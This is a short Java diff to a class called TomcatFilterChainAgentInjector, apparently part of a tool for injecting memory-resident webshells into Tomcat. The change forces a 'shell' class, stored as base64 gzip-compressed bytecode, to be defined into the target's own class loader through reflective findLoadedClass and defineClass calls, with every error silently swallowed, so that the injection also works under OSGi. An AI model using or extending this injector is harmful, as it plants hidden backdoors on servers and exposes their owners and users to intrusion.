@@ -199,17 +199,22 @@ public class TomcatFilterChainAgentInjector implements ClassFileTransformer {
 
     @SuppressWarnings("all")
     public void defineTargetClass(ClassLoader loader) {
+        // Always define into the target class's loader. loadClass() may resolve the shell from the
+        // agent AppClassLoader, which OSGi bundle loaders cannot use for NEW/invoke.
         try {
-            loader.loadClass(getClassName());
-            return;
-        } catch (ClassNotFoundException ignored) {
+            java.lang.reflect.Method findLoadedClass = ClassLoader.class.getDeclaredMethod("findLoadedClass", String.class);
+            findLoadedClass.setAccessible(true);
+            if (findLoadedClass.invoke(loader, getClassName()) != null) {
+                return;
+            }
+        } catch (Throwable ignored) {
         }
         try {
             byte[] classBytecode = gzipDecompress(decodeBase64(getBase64String()));
             java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             defineClass.invoke(loader, classBytecode, 0, classBytecode.length);
-        } catch (Exception ignored) {
+        } catch (Throwable ignored) {
         }
     }
 }
